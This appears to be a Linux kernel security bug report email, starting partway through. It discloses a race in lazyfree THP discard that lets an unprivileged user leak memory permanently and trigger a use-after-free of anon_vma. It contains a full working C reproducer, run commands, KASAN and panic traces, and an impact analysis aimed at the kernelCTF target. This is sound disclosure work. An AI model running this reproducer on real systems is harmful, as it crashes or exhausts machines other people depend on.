free_pgtables+0x103/0x270
exit_mmap+0x19f/0x410
mmput+0x4a/0x100
do_exit+0x2e6/0xae0
do_group_exit+0x30/0x80
get_signal+0x990/0x9c0

[ 1230.107681] Kernel panic - not syncing: hung_task: blocked tasks

I am reporting that as an observed consequence of running the
reproducer, not as a proven effect of the stale pointer. That build has
no KASAN and nothing in the trace says which anon_vma the rwsem belongs
to, so I cannot show the two are the same object. There were no other
kernel reports in that boot apart from the 17 rss-counter lines.


Impact
======

Unprivileged local. No capabilities, no namespaces, nothing beyond
MADV_HUGEPAGE, MADV_FREE, vmsplice, munmap and ordinary memory
pressure.

The memory leak is permanent and unbounded. Every hit costs 2 MB that
is never reclaimed, 80 MB in 20 minutes on a 1 GB VM in my run, and the
rate scales with how fast the loop runs. That alone is a usable local
DoS.

The use-after-free is a read of a freed anon_vma, repeated on every
reclaim pass over the leaked folio for the rest of the boot, so the
attacker controls when it happens by applying memory pressure. The
walk is not purely a read: down_read_trylock() cmpxchgs the rwsem count
and then rwsem_set_reader_owned() stores a current task pointer into
the owner word (kernel/locking/rwsem.c:1284 and :1286), both at an
address taken out of the freed object, and rmap_walk_anon() iterates an
interval tree read from it. I also saw a hang, described above, which
I have not tied to this object.

I did not find a way to control the contents of the freed object.
anon_vma has its own SLAB_TYPESAFE_BY_RCU cache with a constructor, so
it is never merged with anything, and the only refill an unprivileged
process can drive is another anon_vma, which arrives well formed with
root pointing at itself or at its parent. The hardened kernelCTF
target carries SLAB_VIRTUAL on top of that, where a cache's virtual
range is never handed to another cache, so there is nothing else to put
in the slot at all. On a kernel without it the empty slab page can go
back to the page allocator and be reused, which is what the general
protection fault above looks like, but a crash is all I have and I am
not claiming more than that.

I have not written a patch. Happy to test one, and happy to run
longer or differently shaped reproductions if that helps.

--0000000000003cd391065e09e9cf
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<html><body><div dir=3D"auto">Hi,<br><br>__discard_anon_folio_pmd_locked() =
clears the PMD of a lazyfree<br>PMD-mapped anon THP with pmdp_huge_clear_fl=
ush() and puts it back with<br>set_pmd_at() when it turns out the folio can=
not be discarded.  The only<br>lock it shares with a concurrent unmap is th=
e pmd lock.  zap_pmd_range()<br>tests pmd_none(*pmd) without that lock for =
every caller except<br>unmap_mapping_folio(), so a munmap() or an exiting m=
m that lands in the<br>window skips the whole 2 MB range.  The restore then=
 reinstalls the PMD<br>into a VMA that is about to go away.  Nothing update=
s the folio&#39;s rmap<br>or the mm counters, so the folio stays mapped for=
ever, and<br>folio-&gt;mapping keeps pointing at an anon_vma that unlink_an=
on_vmas()<br>frees a moment later.  Reclaim dereferences that pointer on ev=
ery<br>later pass over the folio, for the rest of the boot.<br><br>I hit th=
is as an ordinary user (uid 1000, no capabilities, no<br>namespaces) on a s=
tock v6.12.112 build.  The code is the same in 7.2 and<br>in mainline.  If =
this is already known, sorry for the noise.<br><br><br>How to reproduce<br>=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D<br><br>/*<br> * Lazyfree P=
MD-mapped THP discard restore vs lockless zap_pmd_range().<br> * Build: gcc=
 -O2 -static -pthread -o repro repro.c<br> * Run as an ordinary user, no ar=
guments, then watch dmesg. On a KASAN kernel<br> * (CONFIG_SLUB_RCU_DEBUG=
=3Dy) expect slab-use-after-free in<br> * folio_lock_anon_vma_read() within=
 30 s to 5 min; on a plain kernel expect<br> * &quot;BUG: Bad rss-counter s=
tate ... MM_ANONPAGES&quot; within a couple of minutes.<br> */<br>#define _=
GNU_SOURCE<br>#include &lt;fcntl.h&gt;<br>#include &lt;pthread.h&gt;<br>#in=
clude &lt;signal.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h=
&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/mman.h&gt;<br>#includ=
e &lt;sys/uio.h&gt;<br>#include &lt;sys/wait.h&gt;<br>#include &lt;unistd.h=
&gt;<br><br>#ifndef MAP_DROPPABLE<br>#define MAP_DROPPABLE 0x08<br>#endif<b=
r><br>#define PMD		(2UL &lt;&lt; 20)<br>#define NR_PMDS		16<br>#define NR_T=
HREADS	3<br>#define GEN_SECS	60<br>#define CHUNK		(16UL &lt;&lt; 20)<br><br=
>static void oom_adj(const char *val)<br>{<br>	int fd =3D open(&quot;/proc/=
self/oom_score_adj&quot;, O_WRONLY);<br><br>	if (fd &lt; 0)<br>		return;<br=
>	if (write(fd, val, strlen(val)) &lt; 0) {<br>	}<br>	close(fd);<br>}<br><b=
r>static void *racer(void *arg)<br>{<br>	unsigned int seed =3D (unsigned in=
t)(unsigned long)arg * 7919 + getpid();<br>	size_t len =3D (NR_PMDS + 1) * =
PMD;<br><br>	for (;;) {<br>		char *r, *a;<br>		int i, p[2];<br><br>		r =3D =
mmap(NULL, len, PROT_READ | PROT_WRITE,<br>			 MAP_DROPPABLE | MAP_ANONYMOU=
S, -1, 0);<br>		if (r =3D=3D MAP_FAILED) {<br>			usleep(1000);<br>			contin=
ue;<br>		}<br>		a =3D (char *)(((unsigned long)r + PMD - 1) &amp; ~(PMD - 1=
));<br><br>		madvise(a, NR_PMDS * PMD, MADV_HUGEPAGE);<br>		for (i =3D 0; i=
 &lt; NR_PMDS; i++)<br>			a[i * PMD] =3D 1;<br>		madvise(a, NR_PMDS * PMD, =
MADV_FREE);<br><br>		if (pipe(p) =3D=3D 0) {<br>			fcntl(p[1], F_SETPIPE_SZ=
, 65536);<br>			for (i =3D 0; i &lt; NR_PMDS; i++) {<br>				struct iovec v =
=3D { a + i * PMD + 8192, 4096 };<br><br>				vmsplice(p[1], &amp;v, 1, 0);<=
br>			}<br>		} else {<br>			p[0] =3D p[1] =3D -1;<br>		}<br><br>		usleep(ra=
nd_r(&amp;seed) % 20000);<br>		munmap(r, len);<br>		if (p[0] &gt;=3D 0) {<b=
r>			close(p[0]);<br>			close(p[1]);<br>		}<br>	}<br>	return NULL;<br>}<br>=
<br>static void racer_proc(void)<br>{<br>	pthread_t t;<br>	long i;<br><br>	=
oom_adj(&quot;-1000&quot;);<br>	for (i =3D 0; i &lt; NR_THREADS; i++)<br>		=
pthread_create(&amp;t, NULL, racer, (void *)i);<br>	sleep(GEN_SECS);<br>	_e=
xit(0);<br>}<br><br>static void pressure_proc(void)<br>{<br>	unsigned long =
total =3D 0, n, i, off;<br>	char line[256];<br>	char **ring;<br>	FILE *f;<b=
r><br>	oom_adj(&quot;1000&quot;);<br>	f =3D fopen(&quot;/proc/meminfo&quot;=
, &quot;r&quot;);<br>	while (f &amp;&amp; fgets(line, sizeof(line), f))<br>=
		sscanf(line, &quot;MemTotal: %lu kB&quot;, &amp;total);<br>	if (f)<br>		f=
close(f);<br>	if (!total)<br>		total =3D 1UL &lt;&lt; 20;<br><br>	n =3D (to=
tal &lt;&lt; 10) / CHUNK + 8;<br>	ring =3D calloc(n, sizeof(*ring));<br>	if=
 (!ring)<br>		_exit(1);<br><br>	for (i =3D 0;; i =3D (i + 1) % n) {<br>		if=
 (ring[i])<br>			munmap(ring[i], CHUNK);<br>		ring[i] =3D mmap(NULL, CHUNK,=
 PROT_READ | PROT_WRITE,<br>			       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);<=
br>		if (ring[i] =3D=3D MAP_FAILED) {<br>			ring[i] =3D NULL;<br>			continu=
e;<br>		}<br>		madvise(ring[i], CHUNK, MADV_NOHUGEPAGE);<br>		for (off =3D =
0; off &lt; CHUNK; off +=3D 4096)<br>			ring[i][off] =3D 1;<br>	}<br>}<br><=
br>int main(void)<br>{<br>	pid_t racer_pid, pressure_pid, died;<br><br>	pri=
ntf(&quot;uid %d: racing, watch dmesg\n&quot;, (int)getuid());<br>	fflush(s=
tdout);<br><br>	racer_pid =3D fork();<br>	if (!racer_pid)<br>		racer_proc()=
;<br>	pressure_pid =3D fork();<br>	if (!pressure_pid)<br>		pressure_proc();=
<br><br>	for (;;) {<br>		died =3D wait(NULL);<br>		if (died &lt; 0)<br>			b=
reak;<br>		if (died =3D=3D racer_pid) {<br>			racer_pid =3D fork();<br>			i=
f (!racer_pid)<br>				racer_proc();<br>		} else if (died =3D=3D pressure_pi=
d) {<br>			pressure_pid =3D fork();<br>			if (!pressure_pid)<br>				pressur=
e_proc();<br>		}<br>	}<br><br>	kill(racer_pid, SIGKILL);<br>	kill(pressure_=
pid, SIGKILL);<br>	return 0;<br>}<br><br>One self-contained C file, nothing=
 beyond libc, no arguments, run as a<br>normal user:<br><br>  gcc -O2 -stat=
ic -pthread -o repro repro.c<br>  ./repro<br><br>What it does.  Three threa=
ds loop:<br><br>  mmap 34 MB anon, align to 2 MB<br>  madvise(MADV_HUGEPAGE=
) on 16 PMDs, write one byte in each<br>  madvise(MADV_FREE) on all 16<br> =
 vmsplice() one 4 KB page out of each THP into a pipe that stays open<br>  =
sleep 0 to 20 ms<br>  munmap()<br><br>and one more process allocates and to=
uches a ring of 16 MB chunks whose<br>total is a little over MemTotal, so i=
t stays in the reclaim slowpath<br>instead of settling at some comfortable =
fraction of memory.  It gets<br>OOM-killed now and then and is restarted.  =
The vmsplice pin is the<br>point of the whole thing: it makes ref_count !=
=3D map_count + 1, so the<br>discard fails and takes the set_pmd_at() resto=
re path.<br><br>The process holding the racer threads exits and is restarte=
d every 60 s<br>with its mappings still in flight, so exit_mmap() runs the =
same race as<br>the munmap() in the loop.  Both sides show up in what follo=
ws.<br><br>The regions are mapped with MAP_DROPPABLE.  That is not needed f=
or the<br>leak, plain MAP_PRIVATE plus MADV_FREE leaks exactly the same way=
.  It<br>matters only for making the use-after-free visible on a guest with=
 no<br>swap: after a failed discard, try_to_unmap_one() sets swapbacked on =
the<br>folio (mm/rmap.c:1910-1911) unless the VMA is VM_DROPPABLE, and a<br=
>swapbacked folio sits on the anon LRU, which reclaim does not scan when<br=
>there is no swap (can_reclaim_anon_pages(), mm/vmscan.c:338-360, used at<b=
r>:2406).  With MAP_DROPPABLE the leaked folio stays on the file LRU and<br=
>reclaim keeps walking it.  On a machine with swap I would expect the<br>pl=
ain MADV_FREE case to be revisited too, but I have not tested that.<br><br>=
Guest: qemu, 2 vCPUs, KVM, no swap, THP enabled=3Dmadvise,<br>transparent_h=
ugepage/defrag=3Dmadvise, single node.  1 GB for the plain<br>kernel and 5 =
GB for the KASAN kernel.  The test ran as uid 1000 from a<br>minimal initra=
mfs.<br><br>On the KASAN build the report comes out between 30 s and 264 s =
of<br>uptime; 6 of 7 five-minute boots produced it.  On the plain build I l=
et<br>it run for 20 minutes.<br><br><br>What the code does<br>=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D<br><br>Line numbers below are v6=
.12.113 unless stated otherwise.<br><br>Reclaim side:<br><br>  shrink_folio=
_list() calls try_to_unmap() with TTU_SPLIT_HUGE_PMD and<br>  TTU_SYNC for =
large folios (mm/vmscan.c:1305-1326).<br><br>  try_to_unmap_one(), with pvm=
w.pte =3D=3D NULL, calls<br>  unmap_huge_pmd_locked() (mm/rmap.c:1700-1703)=
 under the pmd lock taken<br>  by page_vma_mapped_walk().<br><br>  For an a=
non folio that is not swapbacked that reaches<br>  __discard_anon_folio_pmd=
_locked() (mm/huge_memory.c:3009).  The PMD is<br>  cleared at :3020 by pmd=
p_huge_clear_flush(), which includes the TLB<br>  flush IPI round trip, and=
 is put back at :3047 when the folio is dirty<br>  or ref_count !=3D map_co=
unt + 1.<br><br>  Locks held across that window: the folio lock, the anon_v=
ma read lock<br>  from rmap_walk_anon_lock(), and the pmd lock.  Not mmap_l=
ock.<br><br>Unmap side, zap_pmd_range() (mm/memory.c:1703-1743):<br><br>  :=
1714  is_swap_pmd(*pmd) || pmd_trans_huge(*pmd) || pmd_devmap(*pmd)<br>    =
     is read without the pmd lock and is false while the PMD is<br>        =
 cleared, so this arm is skipped.<br>  :1722  the lock-and-drop that exists=
 for exactly this class of race<br>         only runs for details-&gt;singl=
e_folio, that is, for<br>         unmap_mapping_folio().  unmap_vmas() fill=
s in details at<br>         mm/memory.c:1885-1889 and never sets single_fol=
io, so munmap<br>         and exit do not take the pmd lock here.<br>  :173=
3  if (pmd_none(*pmd)) { addr =3D next; continue; }<br>         and the 2 M=
B range is gone for good.<br><br>The PTE-level version of the same hazard i=
s already documented in the<br>tree: see the TTU_SYNC comment at mm/vmscan.=
c:1311-1324, and note that<br>the PTE lazyfree restore is safe only because=
 zap_pte_range() takes the<br>ptl.  The other PMD clear/restore sites do no=
t have this problem:<br>khugepaged holds mmap_lock for write, and madvise_f=
ree_huge_pmd(),<br>change_huge_pmd(), the anon split and set_pmd_migration_=
entry() use<br>pmdp_invalidate(), which leaves the entry non-none.<br><br>A=
fter the skip:<br><br>  The restore at mm/huge_memory.c:3047 reinstalls the=
 PMD.  On 6.12,<br>  TTU_SPLIT_HUGE_PMD then splits it (mm/rmap.c:1705-1714=
), leaving 512<br>  present PTEs in a table that free_pte_range() frees wit=
hout zapping.<br>  On 7.2 and 7.3 try_to_unmap_one() goes to walk_abort ins=
tead, the leaf<br>  PMD survives, and free_pmd_range() clears it through<br=
>  pmd_none_or_clear_bad(), printing &quot;bad pmd&quot;.<br><br>  Either w=
ay nothing drops the folio&#39;s mapcount or refcount and nothing<br>  corr=
ects the mm counter, so check_mm() reports the rss leak at<br>  teardown (k=
ernel/fork.c:847) and the folio is never freed.<br><br>  free_pgtables() (m=
m/memory.c:365-419) calls unlink_anon_vmas() at :389<br>  and :410, before =
free_pgd_range() at :414, so the anon_vma is freed<br>  first while folio-&=
gt;mapping still points at it.<br><br>  On every later reclaim pass over th=
e folio,<br>  folio_lock_anon_vma_read() (mm/rmap.c:551) reads folio-&gt;ma=
pping at<br>  :560; the folio_mapped() early-out at :563 cannot fire becaus=
e the<br>  mapcount is leaked; :567 reads anon_vma-&gt;root out of the free=
d object<br>  and :568 runs down_read_trylock() on the rwsem at whatever ad=
dress<br>  that is; rmap_walk_anon() then walks the freed interval tree.<br=
><br>Affected trees.  The discard path came in with 735ecdfaf4e80<br>(&quot=
;mm/vmscan: avoid split lazyfree THP during shrink_folio_list()&quot;),<br>=
first released in v6.11.  Both sides of the race are there in all three<br>=
trees I looked at:<br><br>  v6.12.113  mm/huge_memory.c:3009 (clear :3020, =
restore :3047)<br>             mm/rmap.c:1700, folio_lock_anon_vma_read() a=
t :551<br>             mm/memory.c:1703 (pmd_none at :1733), free_pgtables =
:365<br>  v7.2-rc5   mm/huge_memory.c:3399 (clear :3414, restores :3443, :3=
448)<br>             mm/rmap.c:2072, folio_lock_anon_vma_read() at :633<br>=
             mm/memory.c:1992 (pmd_none at :2016), free_pgtables :373<br>  =
v7.3-rc7   mm/huge_memory.c:3557 (clear :3572, restores :3601, :3606)<br>  =
           mm/rmap.c:2279, folio_lock_anon_vma_read() at :637<br>          =
   mm/memory.c:2123 (pmd_none at :2147), free_pgtables :373<br><br>In 7.2 a=
nd 7.3 the single_folio lock-and-drop became<br>sync_with_folio_pmd_zap() (=
mm/internal.h:587-603 in v7.3-rc7, called<br>from mm/memory.c:2145), still =
only for the single_folio case.<br><br>Tested on v6.12.112.<br><br><br>What=
 I saw<br>=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D<br><br>1) KASAN, v6.12.112 with th=
e kernelCTF release KASAN config<br>(CONFIG_KASAN_GENERIC=3Dy, CONFIG_SLUB_=
RCU_DEBUG=3Dy), 5 GB, 2 vCPUs,<br>reproducer running as uid 1000.  Report a=
t 30.5 s of uptime, &quot;?&quot; lines<br>dropped from the traces, everyth=
ing else verbatim (the release image<br>reports itself as 6.12.112-dirty):<=
br><br>[   30.523383] BUG: KASAN: slab-use-after-free in folio_lock_anon_vm=
a_read+0x57e/0x640<br>[   30.524689] Read of size 8 at addr ffff88802c79166=
0 by task exp_l1_trigger/126<br>[   30.526106] CPU: 0 UID: 1000 PID: 126 Co=
mm: exp_l1_trigger Not tainted 6.12.112-dirty #1<br>Call Trace:<br> kasan_r=
eport+0xce/0x100<br> folio_lock_anon_vma_read+0x57e/0x640<br> rmap_walk_ano=
n+0x349/0x570<br> folio_referenced+0x1e8/0x410<br> shrink_active_list+0x439=
/0xbc0<br> shrink_lruvec+0x145f/0x3000<br> shrink_node+0x82f/0x34b0<br> do_=
try_to_free_pages+0x311/0x1a20<br> try_to_free_pages+0x1d7/0x420<br> __allo=
c_pages_slowpath.constprop.0+0x79b/0x2680<br> __alloc_pages_noprof+0x4fd/0x=
7a0<br> alloc_pages_mpol_noprof+0x1bd/0x430<br> pte_alloc_one+0x1d/0x120<br=
> do_huge_pmd_anonymous_page+0x339/0x1b20<br> __handle_mm_fault+0xf9c/0x126=
0<br> handle_mm_fault+0x41e/0xb90<br> do_user_addr_fault+0x25d/0xb00<br> ex=
c_page_fault+0x71/0xe0<br> asm_exc_page_fault+0x26/0x30<br><br>Allocated by=
 task 128:<br> kmem_cache_alloc_noprof+0x10e/0x2a0<br> __anon_vma_prepare+0=
x2e5/0x550<br> __vmf_anon_prepare+0x15c/0x2a0<br> do_huge_pmd_anonymous_pag=
e+0x120/0x1b20<br> __handle_mm_fault+0xf9c/0x1260<br> handle_mm_fault+0x41e=
/0xb90<br> do_user_addr_fault+0x25d/0xb00<br> exc_page_fault+0x71/0xe0<br><=
br>Freed by task 126:<br> __kasan_slab_free+0x37/0x50<br> slab_free_after_r=
cu_debug+0xc8/0x2d0<br> rcu_core+0x6fc/0xee0<br> handle_softirqs+0x1a2/0x57=
0<br> __irq_exit_rcu+0xae/0xf0<br> sysvec_apic_timer_interrupt+0x71/0x90<br=
><br>Last potentially related work creation:<br> kmem_cache_free+0x236/0x4b=
0<br> __put_anon_vma+0x74/0x210<br> unlink_anon_vmas+0x43c/0x6f0<br> free_p=
gtables+0xf7/0x890<br> vms_clear_ptes+0x497/0x6e0<br> vms_complete_munmap_v=
mas+0x1aa/0x740<br> do_vmi_align_munmap+0x2c9/0x4b0<br> do_vmi_munmap+0x154=
/0x2d0<br> __vm_munmap+0x1fc/0x3e0<br> __x64_sys_munmap+0x59/0x80<br> do_sy=
scall_64+0x58/0x120<br><br>The buggy address belongs to the object at ffff8=
8802c791660<br> which belongs to the cache anon_vma of size 96<br>The buggy=
 address is located 0 bytes inside of<br> freed 96-byte region [ffff88802c7=
91660, ffff88802c7916c0)<br><br>Offset 0 of the object is anon_vma-&gt;root=
.  The allocating stack is the<br>THP fault that created the anon_vma, the =
freeing stack is munmap() -&gt;<br>free_pgtables() -&gt; unlink_anon_vmas()=
 -&gt; __put_anon_vma(), and the<br>reader is direct reclaim running inside=
 the page fault path of a uid<br>1000 task.  SLUB_RCU_DEBUG is what makes K=
ASAN willing to<br>report it for a SLAB_TYPESAFE_BY_RCU cache; without it t=
he same read<br>silently lands on a recycled anon_vma or on recycled memory=
.<br><br>On a locally built v6.12.112 (official config plus KASAN,<br>DEBUG=
_OBJECTS and FAILSLAB, PANIC_ON_OOPS off so later reports stay<br>visible) =
one boot gave the same KASAN report at 57.8 s and then this at<br>291.5 s, =
which is the recycled-memory case:<br><br>[  291.490162] Oops: general prot=
ection fault, probably for non-canonical address 0x800000003372086f<br>[  2=
91.502418] RIP: 0010:down_read_trylock+0x7e/0x160<br>Call Trace:<br> folio_=
lock_anon_vma_read+0xad/0x320<br> rmap_walk_anon+0x249/0x300<br> folio_refe=
renced+0x189/0x2c0<br> shrink_active_list+0x342/0x770<br><br>0x800000003372=
086f in the root slot has the shape of an x86 PTE (NX<br>set, low bits 0x86=
f), so by then the anon_vma slab page had been<br>returned to the page allo=
cator and reused.  That reading is mine and is<br>not proven.<br><br>2) The=
 leak as it shows without any debug option.  Same reproducer on<br>the plai=
n v6.12.112 release build (no KASAN), 1 GB, 2 vCPUs, 20 minutes.<br>17 repo=
rts from check_mm(), all MM_ANONPAGES left positive, each value a<br>multip=
le of 512 pages, one THP each:<br><br>[   62.644293] BUG: Bad rss-counter s=
tate mm:00000000eb31e2e8 type:MM_ANONPAGES val:1024<br>[  369.842397] BUG: =
Bad rss-counter state mm:00000000a829ff5a type:MM_ANONPAGES val:2560<br>[ 1=
026.747257] BUG: Bad rss-counter state mm:0000000098413e7a type:MM_ANONPAGE=
S val:4096<br><br>The 17 reports add up to 20480 pages, that is 40 THPs, 80=
 MB on a 1 GB<br>machine in 20 minutes.  None of it comes back: the mapcoun=
t never drops<br>to zero, so the folio is never freed.  I checked that part=
 on a KASAN<br>guest by killing the racers, leaving only the memory pressur=
e running<br>for another 17 minutes, and counting mapped KPF_ANON|KPF_THP p=
ages<br>through /proc/kpagecount and /proc/kpageflags with no user mapping =
left<br>anywhere: 21 leaked 2 MB folios when the racers died and the same 2=
1 at<br>the end.  On the MAP_DROPPABLE guest the 11 leaked heads kept flipp=
ing<br>their LRU active bit between scans, so reclaim was walking them the<=
br>whole time.<br><br>3) Hung-task panic, plain v6.12.112 release build, sa=
me 20 minute run,<br>at 1230 s.  Two tasks blocked for more than 122 s, bot=
h taking the<br>anon_vma root rwsem for write in unlink_anon_vmas() under<b=
r>free_pgtables(), one from munmap() and one from exit_mmap().  The<br>offi=
cial config has CONFIG_BOOTPARAM_HUNG_TASK_PANIC=3Dy, so the machine<br>pan=
icked.  Traces trimmed the same way:<br><br>[ 1230.003911] INFO: task exp_l=
1_trigger:1279 blocked for more than 122 seconds.<br>[ 1230.011380] task:ex=
p_l1_trigger  state:D stack:0     pid:1279  tgid:1278  ppid:124<br>Call Tra=
ce:<br> rwsem_down_write_slowpath+0x1e4/0x5d0<br> down_write+0x32/0x40<br> =
unlink_anon_vmas+0xb5/0x1d0<br> free_pgtables+0x85/0x270<br> vms_clear_ptes=
+0x144/0x160<br> vms_complete_munmap_vmas+0x65/0x190<br> do_vmi_align_munma=
p+0x15e/0x1d0<br> do_vmi_munmap+0xc3/0x170<br> __vm_munmap+0xca/0x190<br> _=
_x64_sys_munmap+0x1b/0x30<br><br>[ 1230.054660] INFO: task exp_l1_trigger:1=
360 blocked for more than 122 seconds.<br>Call Trace:<br> rwsem_down_write_=
slowpath+0x1e4/0x5d0<br> down_write+0x32/0x40<br> unlink_anon_vmas+0xb5/0x1=
d0<br> free_pgtables+0x103/0x270<br> exit_mmap+0x19f/0x410<br> mmput+0x4a/0=
x100<br> do_exit+0x2e6/0xae0<br> do_group_exit+0x30/0x80<br> get_signal+0x9=
90/0x9c0<br><br>[ 1230.107681] Kernel panic - not syncing: hung_task: block=
ed tasks<br><br>I am reporting that as an observed consequence of running t=
he<br>reproducer, not as a proven effect of the stale pointer.  That build =
has<br>no KASAN and nothing in the trace says which anon_vma the rwsem belo=
ngs<br>to, so I cannot show the two are the same object.  There were no oth=
er<br>kernel reports in that boot apart from the 17 rss-counter lines.<br><=
br><br>Impact<br>=3D=3D=3D=3D=3D=3D<br><br>Unprivileged local.  No capabili=
ties, no namespaces, nothing beyond<br>MADV_HUGEPAGE, MADV_FREE, vmsplice, =
munmap and ordinary memory<br>pressure.<br><br>The memory leak is permanent=
 and unbounded.  Every hit costs 2 MB that<br>is never reclaimed, 80 MB in =
20 minutes on a 1 GB VM in my run, and the<br>rate scales with how fast the=
 loop runs.  That alone is a usable local<br>DoS.<br><br>The use-after-free=
 is a read of a freed anon_vma, repeated on every<br>reclaim pass over the =
leaked folio for the rest of the boot, so the<br>attacker controls when it =
happens by applying memory pressure.  The<br>walk is not purely a read: dow=
n_read_trylock() cmpxchgs the rwsem count<br>and then rwsem_set_reader_owne=
d() stores a current task pointer into<br>the owner word (kernel/locking/rw=
sem.c:1284 and :1286), both at an<br>address taken out of the freed object,=
 and rmap_walk_anon() iterates an<br>interval tree read from it.  I also sa=
w a hang, described above, which<br>I have not tied to this object.<br><br>=
I did not find a way to control the contents of the freed object.<br>anon_v=
ma has its own SLAB_TYPESAFE_BY_RCU cache with a constructor, so<br>it is n=
ever merged with anything, and the only refill an unprivileged<br>process c=
an drive is another anon_vma, which arrives well formed with<br>root pointi=
ng at itself or at its parent.  The hardened kernelCTF<br>target carries SL=
AB_VIRTUAL on top of that, where a cache&#39;s virtual<br>range is never ha=
nded to another cache, so there is nothing else to put<br>in the slot at al=
l.  On a kernel without it the empty slab page can go<br>back to the page a=
llocator and be reused, which is what the general<br>protection fault above=
 looks like, but a crash is all I have and I am<br>not claiming more than t=
hat.<br><br>I have not written a patch.  Happy to test one, and happy to ru=
n<br>longer or differently shaped reproductions if that helps.<br></div></b=
ody></html>

--0000000000003cd391065e09e9cf--

